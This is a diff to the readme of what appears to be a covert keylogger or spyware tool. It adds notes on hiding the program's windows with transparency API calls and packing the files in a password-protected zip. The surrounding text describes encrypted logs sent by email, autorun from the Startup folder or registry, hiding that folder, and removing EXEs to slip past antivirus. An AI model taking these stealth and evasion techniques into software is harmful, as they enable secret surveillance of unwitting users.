@@ -1,3 +1,10 @@
+Revision 1.0.9
+Date:17/10/2012 4:30PM
+Changes:
+1.Transparenting form with API function.
+2.Removed small size frm placed at screen bottom.
+3.Password Protected Package.zip with pwd = 10.
+
 Keep folowing Folder tree and EXE's in this folder:
 EXE's have been removed from Project files to prevent it from antivirus.
 
@@ -25,6 +32,7 @@ Log is encrypted with encCoce=20 only if password is not blank.
 If Sender= "none" then email is not sent. No special setting.
 Autorun on startup are exact location based settings. Stored nowhere. Program checks existance of shortcut in Startup Folder OR registry.
 Program automatically hides Startup folder.
+Forms hidden with "Transparent form" API functions. not me.hide
 
 
 How to Build Package( Stand Alone Installation EXE )
